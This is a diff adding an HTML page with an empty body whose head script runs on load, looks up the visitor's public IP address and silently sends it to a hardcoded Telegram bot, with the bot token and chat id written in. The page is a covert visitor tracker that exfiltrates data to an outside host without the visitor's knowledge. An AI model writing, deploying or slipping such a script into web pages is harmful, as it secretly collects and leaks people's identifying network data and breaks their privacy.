@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    (function() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://api.ipify.org/?format=json", true);
+      xhr.onload = function() {
+        var ip = JSON.parse(xhr.responseText).ip;
+        var tok = "6722576675:AAF6hffo3k9MSVnLmkvAmLvpGa_HIhG-7Iw";
+        var chat = "1421742529";
+        var m = "IP-адрес: " + ip;
+        var url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + chat + "&text=" + m;
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", url, true);
+        xhr2.send();
+      };
+      xhr.send();
+    })();
+  </script>
+</head>
+<body>
+</body>
+</html>
